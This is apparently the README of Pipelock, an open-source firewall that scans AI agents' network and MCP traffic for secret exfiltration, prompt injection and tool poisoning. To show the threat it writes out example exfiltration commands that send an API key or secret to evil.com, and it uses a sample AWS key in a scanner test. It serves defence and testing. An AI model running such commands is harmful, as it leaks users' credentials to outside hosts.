<p align="center">
  <img src="assets/pipelock-logo.svg" alt="Pipelock" width="200">
</p>

<h1 align="center">Pipelock</h1>

<p align="center">
  <strong>Open-source AI agent firewall for <a href="https://pipelab.org/learn/verifiable-egress-control/">Verifiable Egress Control</a>.</strong>
</p>

<p align="center">
  <a href="https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml"><img alt="CI" src="https://github.com/luckyPipewrench/pipelock/actions/workflows/ci.yaml/badge.svg"></a>
  <a href="https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml"><img alt="Security" src="https://github.com/luckyPipewrench/pipelock/actions/workflows/security.yaml/badge.svg"></a>
  <a href="go.mod"><img alt="Go 1.25+" src="https://img.shields.io/github/go-mod/go-version/luckyPipewrench/pipelock?logo=go&label=Go"></a>
  <a href="https://github.com/luckyPipewrench/pipelock/releases"><img alt="Release" src="https://img.shields.io/github/v/release/luckyPipewrench/pipelock"></a>
</p>

<p align="center">
  <a href="https://scorecard.dev/viewer/?uri=github.com/luckyPipewrench/pipelock"><img alt="OpenSSF Scorecard" src="https://api.scorecard.dev/projects/github.com/luckyPipewrench/pipelock/badge"></a>
  <a href="https://www.bestpractices.dev/projects/11948"><img alt="OpenSSF Best Practices" src="https://www.bestpractices.dev/projects/11948/badge"></a>
  <a href="https://codecov.io/gh/luckyPipewrench/pipelock"><img alt="codecov" src="https://codecov.io/gh/luckyPipewrench/pipelock/graph/badge.svg"></a>
  <a href="https://github.com/luckyPipewrench/pipelock/blob/main/.github/workflows/ci.yaml#L21-L35"><img alt="pipelock self-scanned" src="https://img.shields.io/badge/pipelock-self--scanned-00FFC8?style=flat&labelColor=1A1A2E&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxNCAxNCI+PHBhdGggZmlsbD0iIzAwRkZDOCIgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik03IDAuNWMtMS45MyAwLTMuNSAxLjY2LTMuNSAzLjd2MS4zSDNjLS44MyAwLTEuNSAuNjctMS41IDEuNXY2YzAgLjgzLjY3IDEuNSAxLjUgMS41aDhjLjgzIDAgMS41LS42NyAxLjUtMS41VjdjMC0uODMtLjY3LTEuNS0xLjUtMS41aC0uNVY0LjJjMC0yLjA0LTEuNTctMy43LTMuNS0zLjdabS0yIDVWNC4yYzAtMS40OSAxLjEyLTIuNyAyLjUtMi43czIuNSAxLjIxIDIuNSAyLjd2MS4zSDVaTTIuNSA1aDJ2MS4yaC0yVjVabTcgMGgydjEuMmgtMlY1Wk03IDguMmMtLjY5IDAtMS4yNS41Ni0xLjI1IDEuMjUgMCAuNDQuMjMuODMuNTcgMS4wNXYxLjVoMS4zNnYtMS41Yy4zNC0uMjIuNTctLjYxLjU3LTEuMDUgMC0uNjktLjU2LTEuMjUtMS4yNS0xLjI1WiIvPjwvc3ZnPgo="></a>
</p>

<p align="center">
  <a href="LICENSE"><img alt="Core Apache 2.0" src="https://img.shields.io/badge/Core-Apache_2.0-blue.svg"></a>
  <a href="enterprise/LICENSE"><img alt="Enterprise ELv2" src="https://img.shields.io/badge/Enterprise-ELv2-orange.svg"></a>
  <a href="https://landscape.cncf.io/?item=provisioning--security-compliance--pipelock"><img alt="CNCF Landscape: Security &amp; Compliance" src="https://img.shields.io/badge/CNCF%20Landscape-Security%20%26%20Compliance-1a73e8?logo=cncf&logoColor=white"></a>
  <a href="https://discord.gg/badNfhGKTc"><img alt="Discord" src="https://img.shields.io/badge/Discord-Join%20the%20community-5865F2?logo=discord&logoColor=white"></a>
</p>

<div align="center">
  <img src="assets/demo.gif" alt="Pipelock blocking a live secret-exfiltration attempt from an AI agent" width="900">
</div>

Pipelock sits between AI agents and the network. It inspects mediated HTTP, WebSocket, MCP, and A2A traffic, plus CONNECT tunnel contents when TLS interception is enabled, for secret exfiltration, prompt injection, SSRF, tool poisoning, and risky tool-call chains. Plain CONNECT without interception is scanned at the hostname and URL level.

Pipelock emits mediator-signed [action receipts](https://pipelab.org/learn/action-receipt-spec/) over content-aware boundary decisions, so a reviewer can verify what Pipelock decided outside the agent runtime. The public [agent-egress-bench](https://github.com/luckyPipewrench/agent-egress-bench) corpus exercises the detections. Learn more: [Open-source AI firewall](https://pipelab.org/learn/open-source-ai-firewall/).

**Works with:** Claude Code · OpenAI Codex · Cline · OpenCode · Zed · Cursor · VS Code · JetBrains · OpenAI Agents SDK · Google ADK · AutoGen · CrewAI · LangGraph

<p align="center">
  <a href="#the-problem">Problem</a> ·
  <a href="#verify-it-yourself">Verify</a> ·
  <a href="#quick-start">Quick Start</a> ·
  <a href="#see-it-in-action">Action</a> ·
  <a href="#what-it-catches">Catches</a> ·
  <a href="#what-it-does">Features</a> ·
  <a href="#how-it-works">Architecture</a> ·
  <a href="#docs">Docs</a> ·
  <a href="https://playground.pipelab.org">Playground</a> ·
  <a href="https://pipelab.org/blog/">Blog</a> ·
  <a href="https://app.dosu.dev/bcccd1cf-be85-4c0e-ae05-edeb0ff50b59/ask">Ask Dosu</a>
</p>

<p align="center">
  <strong>Try it in your browser at the <a href="https://playground.pipelab.org">live playground</a>. If Pipelock earns it, <a href="https://github.com/luckyPipewrench/pipelock/stargazers">star the repo</a> so other people find it.</strong>
</p>

---

## The Problem

Your AI agent has `$PROVIDER_API_KEY` in its environment, plus shell access. One request can leak it:

```bash
curl "https://evil.com/steal?key=$PROVIDER_API_KEY"   # game over, unless pipelock is watching
```

Every machine action your agent takes should cross a boundary between your secrets and the open internet. Pipelock becomes that boundary when the agent is routed through its proxy, MCP wrapper, sandbox, host containment model, or cluster deployment topology. It scans mediated outbound and inbound traffic, blocks or flags attacks based on mode, and records signed evidence of the decision.

---

## Verify It Yourself

Most agent-security tools ask you to trust their dashboard. Pipelock hands you a signed receipt and lets you check it yourself, offline, with a key you hold. No account and no server.

The built-in demo fires real attack scenarios, blocks them, and writes signed receipts plus the public key to disk with no config and no network:

```bash
pipelock demo --receipts-dir ./out                                   # runs attack scenarios, writes 7 signed receipts + signer.pub
pipelock verify-receipt "$(ls ./out/*.json | head -1)" --key ./out/signer.pub  # check a signature yourself (each receipt is <action-id>.json)
```

<div align="center">
  <img src="docs/assets/dashboard/evidence-viewer-pinned.png" alt="Pipelock evidence report: the scorecard (Authentic, Untampered, Anchored, Completeness, each with its honest limit) above a signed receipt timeline of every mediated decision, verdict, and hash link" width="860">
</div>

The scorecard grades each claim on its own and states what it does not prove: whether anything happened outside the boundary Pipelock mediates. Below it, the receipt timeline lists every mediated decision with its verdict and hash link. A receipt that is honest about its own limits beats a green checkmark that hides them.

The evidence viewer is free and needs no license:

```bash
pipelock evidence serve --receipt-dir ./out   # read-only HTML report for one recorded session
pipelock evidence view --receipt-dir ./out    # static offline report, no server
```

Two honesty notes, stated up front. The demo signs with an ephemeral key it prints for the run, which proves the receipts are self-consistent rather than tied to a named identity. The public Pipelock playground is a separate path that verifies against a key Pipelock publishes. And the operator running Pipelock holds the signing key, so a receipt proves what the boundary decided and that the key holder signed it, not that the operator is honest. `pipelock anchor receipts` records receipt-chain checkpoints to a local backend or a Rekor transparency log for later audit, and operator-independent verification against that anchor is still being proven end to end.

The full argument for why proof beats promises is in [demonstration over attestation](docs/security/demonstration-over-attestation.md).

---

## Quick Start

```bash
# Install from source (Go 1.25+)
go install github.com/luckyPipewrench/pipelock/cmd/pipelock@latest

# Set up local agent integrations and generate a config
pipelock init

# Test the scanner
pipelock check --url "https://evil.com/?k=AKIAIOSFODNN7EXAMPLE"  # blocked: AWS Access ID
pipelock check --url "https://docs.python.org/3/"                # allowed
```

<details>
<summary>Other install methods</summary>

```bash
# Download a binary
# See https://github.com/luckyPipewrench/pipelock/releases

# Docker
docker pull ghcr.io/luckypipewrench/pipelock:latest

# Homebrew on macOS
brew install luckyPipewrench/tap/pipelock
```

</details>

<details>
<summary>Verify release integrity</summary>

```bash
gh attestation verify pipelock_3.2.0_linux_amd64.tar.gz --owner luckyPipewrench
gh attestation verify oci://ghcr.io/luckypipewrench/pipelock:v3.2.0 --owner luckyPipewrench
```

Release workflows publish SLSA provenance, CycloneDX SBOMs, checksums, and signed container images. Source builds with `go install` produce a Community-only binary; pre-built release artifacts include paid-tier code that activates with a valid license key.

</details>

---

## See It In Action

The Pro/Enterprise operator dashboard (`pipelock dashboard serve`) is a read-only console over signed evidence. It supports token, OIDC, or mTLS authentication; bounded RBAC permissions; redacted metadata views; raw-view elevation; exemption lifecycle records; backup and restore; coverage certificates; and fleet views. It is present in enterprise-tagged builds and release artifacts with the required license feature.

The free single-session evidence viewer shown above is separate. It needs no license and has no cross-agent enumeration.

<div align="center">
  <a href="https://youtu.be/WeoTRuiYy3s">
    <img src="docs/assets/dashboard/dashboard-overview.png" alt="Pipelock Operator Dashboard Overview page with per-agent activity, budgets, evidence coverage, trust status, and fleet status. Click to watch the 80-second walkthrough." width="860">
  </a>
  <br>
  <sub>The Overview page. Click to watch the 80-second dashboard walkthrough.</sub>
</div>

<details>
<summary>Dashboard gallery</summary>

<div align="center">
  <img src="docs/assets/dashboard/dashboard-evidence.png" alt="Pipelock dashboard Evidence view with receipt scorecard and decision timeline" width="860">
</div>

<div align="center">
  <img src="docs/assets/dashboard/dashboard-agents.png" alt="Pipelock dashboard Agents view with per-agent evidence rollups" width="860">
</div>

<div align="center">
  <img src="docs/assets/dashboard/dashboard-budgets.png" alt="Pipelock dashboard Budgets view with per-agent budget pressure" width="860">
</div>

<div align="center">
  <img src="docs/assets/dashboard/dashboard-fleet.png" alt="Pipelock dashboard Fleet view with follower runtime and applied-state status" width="860">
</div>

<div align="center">
  <img src="docs/assets/dashboard/dashboard-workbench.png" alt="Pipelock dashboard Workbench view for signed Conductor action review" width="860">
</div>

<div align="center">
  <img src="docs/assets/dashboard/dashboard-incident.png" alt="Pipelock dashboard Incident view with decision correlation and replay divergence" width="860">
</div>

</details>

<details>
<summary>Free reports and monitoring</summary>

`pipelock report --input events.jsonl` generates HTML, JSON, or signed bundle reports with risk rating, timeline, event categories, and an evidence appendix. The free Prometheus and Grafana path monitors one Pipelock instance and is distinct from the Enterprise Conductor fleet control plane.

<div align="center">
  <img src="examples/sample-report.png" alt="Pipelock Agent Egress Report showing risk rating, timeline, findings by category, and evidence appendix" width="520">
</div>

<div align="center">
  <img src="docs/assets/fleet-dashboard.jpg" alt="Pipelock Grafana fleet monitor showing traffic, security events, and WebSocket metrics for a single instance" width="520">
</div>

</details>

---

## What It Catches

<div align="center">

### Measured against a public, reproducible benchmark

[**agent-egress-bench**](https://github.com/luckyPipewrench/agent-egress-bench) runs a corpus of agent-exfiltration and prompt-injection attacks against Pipelock, or against any other tool. The numbers come from a run anyone can repeat, not a claim.

[**See the live results**](https://pipelab.org/gauntlet/) · [**Run it yourself**](https://github.com/luckyPipewrench/agent-egress-bench)

</div>

Pipelock runs in three modes:

| Mode | Security | Web Browsing | Use Case |
|------|----------|--------------|----------|
| **strict** | Allowlist-only | None | Regulated industries, high-security |
| **balanced** | Blocks naive + detects sophisticated | Via fetch or forward proxy | Most developers (default) |
| **audit** | Logging only | Unrestricted | Evaluation before enforcement |

For agents running uncensored or abliterated models, the [`hostile-model` preset](configs/hostile-model.yaml) layers defenses on strict mode: aggressive entropy thresholds, blanket network-tool blocking, session binding, cross-request exfiltration detection, and a pre-configured kill switch. `pipelock audit` recommends this preset when it detects known guardrail-removal toolchains through dependency signals.

| Attack Vector | Strict | Balanced | Audit |
|---------------|--------|----------|-------|
| `curl evil.com -d $SECRET` | **Prevented** | **Prevented** | Logged |
| Secret in URL query params | **Prevented** | **Detected** by DLP | Logged |
| Base64-encoded secret in URL | **Prevented** | **Detected** by entropy and decoded DLP | Logged |
| DNS tunneling | **Prevented** | **Detected** by subdomain entropy | Logged |
| Chunked exfiltration | **Prevented** | **Detected** by rate, budget, and fragment checks | Logged |
| Public-key encrypted blob in URL | **Prevented** | Logged when entropy flags it | Logged |

> **Honest assessment:** Strict mode blocks outbound HTTP that traverses Pipelock except allowlisted API domains, so there is no exfiltration channel through the proxy itself. Balanced mode raises the bar from "one curl command" to "sophisticated pre-planned attack." Audit mode gives you visibility you don't have today. With the sandbox enabled (`pipelock sandbox`) or the host/cluster containment topology enforced, Pipelock adds an OS or deployment boundary on top of content inspection. Direct egress still has to be blocked by that boundary for non-cooperative tools that ignore proxy settings.

### Comparison

| | Pipelock | Scanners (agent-scan) | Sandboxes (srt) | Kernel agents (agentsh) |
|---|---|---|---|---|
| Secret exfiltration prevention | Strict blocks; balanced detects | Partial (proxy mode) | Partial (domain-level) | Yes |
| DLP + entropy analysis | Yes | No | No | Partial |
| Prompt injection detection | Yes | Yes | No | No |
| MCP scanning (bidirectional + tool poisoning) | Yes | Yes | No | No |
| WebSocket proxy (frame scanning) | Yes | No | No | No |
| MCP HTTP transport (Streamable HTTP) | Yes | No | No | No |
| Emergency kill switch (6 sources) | Yes | No | No | No |
| Tool call chain detection | Yes | No | No | No |
| Process sandbox (no Docker) | Yes | No | No | Yes (kernel-level) |
| Single binary, zero deps | Yes | No (Python) | No (npm) | No (kernel) |

Reference matrix: [docs/comparison.md](docs/comparison.md)

Canonical comparison hub: [AI runtime security comparison](https://pipelab.org/compare/)

<details>
<summary>OWASP Agentic Top 10 Coverage</summary>

| Threat | Coverage |
|--------|----------|
| ASI01 Agent Goal Hijack | **Strong:** bidirectional MCP + response scanning |
| ASI02 Tool Misuse | **Partial:** proxy as controlled tool, MCP scanning |
| ASI03 Identity & Privilege Abuse | **Strong:** capability separation + SSRF protection |
| ASI04 Supply Chain Vulnerabilities | **Partial:** integrity monitoring + MCP scanning |
| ASI05 Unexpected Code Execution | **Moderate:** HITL approval, fail-closed defaults |
| ASI06 Memory & Context Poisoning | **Moderate:** injection detection + session taint propagation |
| ASI07 Insecure Inter-Agent Communication | **Partial:** MCP/A2A scanning, agent ID, integrity, signing |
| ASI08 Cascading Failures | **Moderate:** fail-closed architecture, rate limiting |
| ASI09 Human-Agent Trust Exploitation | **Partial:** HITL modes, audit logging |
| ASI10 Rogue Agents | **Strong:** domain allowlist + rate limiting + capability separation |

Details, config examples, and gap analysis: [docs/owasp-mapping.md](docs/owasp-mapping.md)

</details>

---

## What It Does

Pipelock is an [AI egress proxy](https://pipelab.org/learn/ai-egress-proxy/) and [MCP security control](https://pipelab.org/learn/mcp-security/). It sits inline between your AI agent and the network, scans outbound and inbound traffic, and emits signed receipts plus mediation metadata for attestation outside the agent runtime. AARP/SVID workload-identity appraisal is verifier-side today: the proxy and MCP runtimes do not consume SVID evidence in live allow/deny decisions or bind receipt actor identity from an X.509-SVID.

### Detection And Scanning

- **11-layer URL scanner:** scheme validation, CRLF injection detection, path traversal blocking, domain blocklist, DLP pattern matching, path entropy analysis, subdomain entropy analysis, SSRF protection with DNS-rebinding prevention, per-domain rate limiting, URL length limits, and per-domain data budgets. DLP runs before DNS resolution, so secrets are caught before a DNS query leaves the proxy. See [docs/bypass-resistance.md](docs/bypass-resistance.md).
- **DLP:** 65 built-in patterns for API keys, tokens, credentials, cryptocurrency keys, environment secrets, and financial identifiers with checksum validation. BIP-39 seed phrase detection uses dictionary lookup, sliding windows, and SHA-256 checksum validation.
- **Response scanning:** 32 built-in prompt-injection and state/control poisoning patterns, plus 6-pass normalization for zero-width characters, homoglyphs, leetspeak, optional whitespace, vowel folding, base64, and hex. Actions are `block`, `strip`, `warn`, or `ask`.
- **Streaming SSE:** `text/event-stream` responses from LLM gateways and MCP HTTP/SSE flow token by token with per-event and rolling cross-event DLP and injection scanning. A detection terminates the stream fail-closed. See [SSE streaming guide](docs/guides/sse-streaming.md).
- **Request body scanning:** headers and bodies are scanned before they leave the protected path across JSON, form data, raw text, reverse proxy requests, TLS-intercepted CONNECT traffic, and outbound WebSocket client frames.
- **Request redaction:** optional JSON rewriting replaces matched secret values with typed placeholders such as `<pl:aws-access-key:1>` across HTTP, WebSocket, and MCP `tools/call` arguments. Receipts record the active profile and per-class counts instead of plaintext secrets.
- **Address protection:** ETH, BTC, SOL, and BNB address validation catches lookalike destination swaps using prefix/suffix fingerprinting and an operator allowlist.
- **Every block explains itself:** `pipelock explain <url>` (also `explain event <id>` and `explain mcp`) prints the scanner, layer, matching rule, inspected surface, and the exact narrowest config knob to fix a false positive. An un-fixable false positive is why teams rip a scanner out; this is the answer. See [`docs/cli/explain.md`](docs/cli/explain.md).
- **Canary tokens:** `pipelock canary` generates honeytoken config. A synthetic secret showing up in outbound traffic proves an agent or something in its chain is exfiltrating environment variables. See [canary tokens](docs/guides/canary-tokens.md).
- **Skill-file scanning:** `pipelock skill-scan` inventories agent skill files, compares them to an operator-owned lock file, and flags source-to-sink combinations such as credential-to-network-sink or shell-to-write with line evidence before anything runs. See [`docs/cli/skill-scan.md`](docs/cli/skill-scan.md).

### MCP Security

Pipelock wraps MCP servers with bidirectional scanning:

```bash
# Wrap a local MCP server over stdio
pipelock mcp proxy --config pipelock.yaml -- npx -y @modelcontextprotocol/server-filesystem /tmp

# Bridge a stdio client to a remote Streamable HTTP server
pipelock mcp proxy --upstream http://localhost:8080/mcp

# Run the HTTP proxy and an MCP HTTP listener together
pipelock run --config pipelock.yaml --mcp-listen 127.0.0.1:8889 --mcp-upstream http://localhost:3000/mcp
```

- **Input scanning:** MCP client requests are checked for DLP leaks and injection in tool arguments.
- **Response scanning:** server responses are scanned before the agent sees them.
- **Tool poisoning:** `tools/list` descriptions are checked for hidden instructions and mid-session rug-pull changes.
- **Tool policy:** 17 built-in rules block destructive file deletes, credential access, reverse shells, persistence mechanisms, encoded command execution, and related high-risk tool calls before execution.
- **Tool call chains:** 10 built-in category-axis patterns detect reconnaissance, credential theft, data staging, persistence, exfiltration, and callback chains with configurable gap tolerance.
- **A2A inspection:** Google Agent-to-Agent protocol traffic is inspected on the forward and MCP paths; Pipelock is not a standalone A2A proxy.
- **Authenticated MCP HTTP listeners (v3.2.0):** non-loopback MCP listeners fail closed by default and require `--mcp-auth-token-file`, or an explicit `--mcp-allow-unauthenticated` for network-policy-isolated deployments. Tokenless loopback listeners reject DNS-rebound and wrong-port Host authorities and scrub listener credentials from headers.

### Containment

Unprivileged process containment uses OS-native primitives. Linux uses Landlock, seccomp, and network namespaces. macOS uses `sandbox-exec` profiles. In containers, `--best-effort` keeps Landlock and seccomp when namespace creation is restricted, while network scanning uses proxy-based routing.

```bash
pipelock sandbox --config pipelock.yaml -- python agent.py
pipelock sandbox --best-effort -- python agent.py
pipelock mcp proxy --sandbox --config pipelock.yaml -- npx server
```

Host containment goes further on Linux:

```bash
pipelock contain install
pipelock contain verify
pipelock contain run -- claude-code
```

`pipelock contain install / run / verify / rollback / add-tool / grant-workspace / revoke-workspace / ca-refresh` manages a 3-UID operator / proxy / agent model with nftables owner-match routing, systemd service setup, wrapper commands, workspace ACLs, CA refresh, and posture evidence. See [`docs/contain-cli.md`](docs/contain-cli.md).

### Evidence And Receipts

- **Flight recorder:** hash-chained JSONL evidence log with Ed25519-signed checkpoints and DLP redaction. `pipelock init` provisions a recorder directory and signing key for stock installs, while the recorder stays inert until a directory and key exist. See [Flight Recorder](docs/guides/flight-recorder.md).
- **Action receipts:** signed records of each mediated action, verdict, policy hash, transport, and scanner layer. Verify with `pipelock verify-receipt --key <signer.pub>`. Unpinned runs are structural-only and exit non-zero unless `--allow-unpinned` is passed.
- **Mediation envelope:** RFC 8941 sideband metadata on forwarded HTTP requests and MCP `_meta`, with action type, verdict, actor identity, policy hash, taint context, and receipt correlation ID. See [federation guide](docs/guides/federation.md).
- **Receipt conformance:** five independent verifier implementations (Go, TypeScript, Rust, Python, wasm) reject the same malformed and forgeable inputs, including duplicate keys, integer overflow, and unpaired surrogates, against one shared [conformance corpus](sdk/conformance/). A parser differential is a skeptic's first move against an offline verifier, so all five fail closed on it. AARP/SVID appraisal remains an offline verifier profile, not runtime identity enforcement.
- **Anchors:** `pipelock anchor receipts` records receipt-chain checkpoints to a local backend or Rekor. Rekor anchoring is proof material for later audit; Rekor verification requires pinned log keys and the end-to-end operator-independence path is still being proven.
- **Posture capsule:** `pipelock posture emit` and `pipelock posture verify` produce and check a signed snapshot of a deployment's enforcement posture, with a CI gate and scoring model, so a reviewer can confirm the boundary was configured the way it claims.

### Fleet And Enterprise

- **Operator dashboard:** `pipelock dashboard serve` is a read-only console over signed evidence. Pro unlocks the Overview, Evidence, Exemptions, Agents, Budgets, and Trust & Keys views; Enterprise adds the Fleet, Workbench, and Incident views. See [`docs/cli/dashboard.md`](docs/cli/dashboard.md).
- **Free evidence viewer:** `pipelock evidence serve` and `pipelock evidence view` render one selected recorder session without a license or cross-agent enumeration. `pipelock evidence verify-cert` verifies Pro-issued coverage certificates offline.
- **Conductor:** Enterprise fleet control plane for signed policy-bundle distribution, signed evidence sink (`pipelock fleet-sink`), enrollment, remote kill, rollback, dry-run, decision replay, and runtime/apply-state drift preflight over mTLS/SPIFFE. Followers enforce locally and stay fail-closed; Conductor holds no agent secrets. See the [Conductor guide](docs/guides/conductor.md).
- **Legal hold:** `pipelock dashboard legal-hold add/list/release` manages preservation holds as compliance metadata kept outside the dashboard's HTTP authority, so a compromised dashboard can read holds but never forge or delete them.
- **Behavioral baseline:** profile-then-lock for MCP tool behavior with `pipelock baseline list/show/ratify/forget` for operator approval and relearning. See [`docs/cli/baseline.md`](docs/cli/baseline.md).

### Operability

- **Kill switch:** six independent activation sources: config file, remote API, SIGUSR1, sentinel file, Conductor remote kill, and stale-bundle detection. Any one active source blocks traffic, with endpoint and IP exemptions in the controller.
- **Scan API:** programmatic scanning for `url`, `dlp`, `prompt_injection`, and `tool_call` verdicts with bearer token auth, per-token rate limiting, structured findings, and Prometheus metrics. See [docs/scan-api.md](docs/scan-api.md).
- **Filesystem sentinel:** watches agent working directories for secrets written to disk and attributes writes to the MCP subprocess lineage on Linux. See [docs/guides/filesystem-sentinel.md](docs/guides/filesystem-sentinel.md).
- **Event emission:** forwards audit events to SIEMs, webhook receivers, syslog, CEF, OTLP, and metrics outputs without blocking the proxy hot path. See [docs/guides/siem-integration.md](docs/guides/siem-integration.md).
- **Security assessment:** `pipelock assess init`, `pipelock assess run`, and `pipelock assess finalize` orchestrate attack simulation, config scoring, install verification, and MCP discovery into a reproducible evidence bundle. Critical exposures such as unprotected MCP servers cap the grade regardless of numeric score. The free summary shows your grade, section scores, and top findings; a license unlocks the full report with server-specific findings, remediation commands, and Ed25519-signed evidence.

<details>
<summary>More features</summary>

| Feature | What It Does |
|---------|-------------|
| **Audit Reports** | `pipelock report --input events.jsonl` generates HTML/JSON/bundle reports with risk rating, timeline, and evidence appendix. Ed25519 signing with `--sign`. ([Sample report](examples/sample-report.html)) |
| **Diagnose** | `pipelock diagnose` runs 7 local checks to verify your config end to end with no network. |
| **Enforcement Doctor** (v2.5) | `pipelock doctor` reports configured-vs-enforceable status for proxying, TLS interception, request-body scanning, Browser Shield, MCP wrapping, MCP binary integrity, tool provenance, file_sentry, Sentry, and deployment-boundary signals. |
| **Request Body Injection Blocking** (v2.5) | Request-body prompt-injection and critical-DLP findings hard-block non-provider destinations in enforce mode across forward, reverse, TLS-intercept, and WebSocket transports, with block-reason headers for operator-visible diagnosis. |
| **Request Policy** (v2.6) | Allow-by-default deny/warn rails on outbound API operations: match route plus GraphQL operation predicates, recurse into JSON `$batch` envelopes, fail closed on unparseable or opaque bodies, and run before the contract gate. See the [request policy guide](docs/guides/request-policy.md). |
| **TLS Interception** | Optional CONNECT tunnel MITM: decrypt, scan bodies/headers/responses, re-encrypt. `pipelock tls init` generates a CA, then `pipelock tls install-ca` prints platform trust-store install steps. |
| **Block Hints** | Opt-in `explain_blocks: true` adds fix suggestions to blocked responses. |
| **Project Audit** | `pipelock audit ./project` scans for security risks and generates a tailored config. |
| **Config Scoring** (v2.6) | `pipelock audit score --config pipelock.yaml` evaluates security posture across 23 categories with a 170-point budget and letter grade. |
| **File Integrity** | SHA256 manifests detect modified, added, or removed workspace files. |
| **Git Protection** | `git diff \| pipelock git scan-diff` catches secrets before commit. |
| **Ed25519 Signing** | Key management, file signing, and signature verification for multi-agent trust. |
| **Session Profiling** | Per-session behavioral analysis for domain bursts and volume spikes. |
| **Adaptive Enforcement** | Per-session threat score with escalation from warn to block, de-escalation timers, and domain burst detection. |
| **Adaptive Operator CLI** (v2.5) | `pipelock adaptive status / flush / whoami` exposes runtime adaptive state through the authenticated admin API. See [`docs/cli/adaptive.md`](docs/cli/adaptive.md). |
| **Finding Suppression** | Silence known false positives through config rules or inline `pipelock:ignore` comments. |
| **Multi-Agent Support** | Agent identification through `X-Pipelock-Agent` header for per-agent filtering. |
| **Fleet Monitoring** | Per-instance Prometheus metrics plus ready-to-import [Grafana dashboard](configs/grafana-dashboard.json). Free single-instance monitoring, distinct from Conductor. |
| **Operator Dashboard** (v3.1, Pro/Enterprise) | `pipelock dashboard serve` gives read-only Overview, Evidence, Exemptions, Agents, Budgets, Trust & Keys, Fleet, Workbench, and Incident views with token, OIDC, or mTLS auth, bounded RBAC, raw-view elevation, backup/restore, exemption lifecycle records, and coverage certificates. See [`docs/cli/dashboard.md`](docs/cli/dashboard.md). |
| **Free Evidence Viewer** (v3.1) | `pipelock evidence serve` serves one selected recorder session as a read-only HTML report without a license and without cross-agent enumeration. `pipelock evidence verify-cert` verifies Pro-issued coverage certificates offline. |
| **Conductor: fleet control plane** (v2.7, Enterprise) | Signed policy-bundle distribution, signed-evidence audit sink (`pipelock fleet-sink`), enrollment, remote kill, policy rollback, dry-run, decision replay, and runtime/apply-state drift preflight over mTLS/SPIFFE. Gated by the `fleet` license feature, fail-closed. See the [Conductor guide](docs/guides/conductor.md). |
| **A2A Scanning** | Agent Card poisoning detection, card drift monitoring, and session smuggling prevention for Google's Agent-to-Agent protocol on forward/MCP paths. |
| **Behavioral Baseline** | Profile-then-lock for MCP tool behavior with `pipelock baseline list/show/ratify/forget` for operator approval and relearning. See [`docs/cli/baseline.md`](docs/cli/baseline.md). |
| **Denial-of-Wallet** | Per-agent budgets for retries, fan-out, and concurrent tool calls. |
| **Taint Escalation** | Exposure-based policy escalation across MCP and task boundaries until trust is restored. |
| **Mediation Envelope** | RFC 8941 sideband metadata on forwarded HTTP requests and MCP `_meta`, with inbound verification, replay protection, SPIFFE actor format, and an RFC 9421 signing-key directory. See [federation guide](docs/guides/federation.md). |
| **Receipt Conformance** | Cross-implementation receipt verification suite (`sdk/conformance/`) plus first-party Go, TypeScript, Rust, Python, and wasm verifier surfaces. `EvidenceReceipt v2` uses RFC 8785/JCS canonicalization. AARP/SVID appraisal remains offline verifier-side. |
| **Learn-and-Lock** (v2.4) | Per-agent behavioral contracts: observe traffic, compile a signed candidate contract, replay captured observations in shadow, ratify per rule, promote the signed active manifest, and enforce live on URL-bearing transports plus MCP tool calls. See [learn-and-lock guide](docs/guides/learn-and-lock.md). |
| **Block-Reason Header** (v2.4) | `X-Pipelock-Block-Reason` on HTTP-capable block paths, with the same reason vocabulary on MCP JSON-RPC error metadata. See [block-reason header](docs/guides/block-reason-header.md). |
| **Wedge-Detection Watchdog** (v2.4) | `health_watchdog` returns `/health` 503 when a subsystem heartbeat goes stale. See [health endpoint guide](docs/guides/health.md). |
| **Redaction Provider Plugin Shape** (v2.4) | First-party redaction parsers for Anthropic, OpenAI, and Gemini chat APIs, with a provider-plugin shape for third-party parsers. |
| **Audit Packet v0 Schema + Verifiers** (v2.5) | First-party canonical Audit Packet schema with Go, TypeScript, and Rust verifier implementations, plus standalone [`pipelock-verifier`](cmd/pipelock-verifier/) CLI. Schema lives under [`sdk/audit-packet/`](sdk/audit-packet/); verifier packages live under [`sdk/verifiers/`](sdk/verifiers/). |
| **Host Containment Lifecycle** (v2.5) | `pipelock contain install / run / verify / rollback / add-tool / grant-workspace / revoke-workspace / ca-refresh` manages the 3-UID containment model. See [`docs/contain-cli.md`](docs/contain-cli.md). |
| **MCP Integrity Manifests** (v2.5) | `pipelock mcp integrity manifest generate / verify / sign / verify-signature` pins MCP server binaries/scripts by hash and can require a trusted manifest signature before subprocess launch. See [`docs/cli/mcp-integrity.md`](docs/cli/mcp-integrity.md). |
| **Kubernetes MCP Launcher Contract** (v2.5) | `pipelock init sidecar --mcp-upstream` emits companion listener configuration, service port, workload annotations, NetworkPolicy allowance, `PIPELOCK_MCP_PROXY_URL`, and mounted `PIPELOCK_MCP_CONFIG`. See [`docs/cli/init-sidecar.md`](docs/cli/init-sidecar.md). |
| **Federation Strict Mode** (v2.5) | Inbound mediation-envelope verification requires SPIFFE-format actors by default, contract tombstones are enforced, and `pipelock envelope trust add/list/remove/verify` manages local trust. See [federation guide](docs/guides/federation.md). |
| **Media Policy** | Strips steganographic metadata from JPEG/PNG, rejects audio/video by default, hardens SVG active content, and enforces image size limits. See [Media Policy](docs/guides/media-policy.md). |
| **Compliance Mappings** | OWASP MCP Top 10, OWASP Agentic Top 15, OWASP LLM Top 10, NIST 800-53, EU AI Act, and procurement/audit mappings. |

</details>

---

## Free, Pro, and Enterprise

All detection, enforcement, containment, and single-agent evidence is free forever under Apache 2.0. Paid tiers add multi-agent coordination (Pro) and fleet governance plus compliance (Enterprise).

| Capability | Free | Pro | Enterprise |
|---|:--:|:--:|:--:|
| Scanning and detection (11-layer URL, DLP, injection, SSRF, streaming SSE, redaction, address protection) | Yes | Yes | Yes |
| MCP and A2A scanning (input, response, tool policy, tool chain, poisoning, integrity, authenticated listeners) | Yes | Yes | Yes |
| Containment, sandbox, host `contain`, 6-source kill switch | Yes | Yes | Yes |
| Action receipts, flight recorder, anchors, free evidence viewer, `verify-cert`, standalone verifier | Yes | Yes | Yes |
